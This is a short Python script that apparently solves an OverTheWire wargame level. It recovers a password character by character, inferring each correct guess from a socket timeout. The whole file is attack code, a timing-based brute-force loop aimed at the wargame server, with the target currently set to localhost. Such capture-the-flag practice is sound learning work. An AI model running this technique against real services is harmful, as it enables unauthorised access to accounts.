import socket
import string
import time

# SERVER = 'formulaone.labs.overthewire.org'
# PORT = 4091
SERVER = 'localhost'
PORT = 4092


def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER, PORT))
    return s

password = ''

for inx in range(4):

    # for ch in string.ascii_letters + string.digits:
    for ch in string.printable:
        s = connect_to_server()
        s.recv(1024)  # Receive initial data
        s.send((password + ch + '$' + '\n').encode())
        s.settimeout(1*inx)
        try:
            # start = time.time()
            response = s.recv(1024).decode()
            # end = time.time()
            # elapsed = end - start
            # print(f"Trying {password + ch}: {elapsed:.4f} seconds")
        except socket.timeout:
            password += ch
            print(f"Found character {inx + 1}: {ch}")
            break
        else:
            continue
        # finally:
        #     s.close()
    print(f"Current password: {password}")
